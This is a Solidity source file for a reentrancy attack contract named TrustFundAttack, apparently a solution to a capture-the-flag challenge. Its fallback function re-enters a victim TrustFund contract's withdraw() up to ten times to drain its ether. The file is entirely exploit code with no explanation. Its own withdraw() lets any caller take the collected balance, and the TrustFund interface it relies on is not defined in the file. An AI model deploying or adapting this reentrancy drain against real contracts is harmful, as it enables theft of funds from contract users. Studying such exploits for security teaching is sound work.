pragma solidity 0.4.24;


contract TrustFundAttack {

    uint i;

    function () external payable {
        if (i < 10) {
            this.attack(msg.sender);
        }
    }

    function attack(address _victim) external returns(bool) {
        TrustFund victim = TrustFund(_victim);

        victim.withdraw();
        i++;
    }

    function getBalance() external view returns(uint256) {
        return address(this).balance;
    }

    function withdraw() external {
        msg.sender.transfer(address(this).balance);
    }
}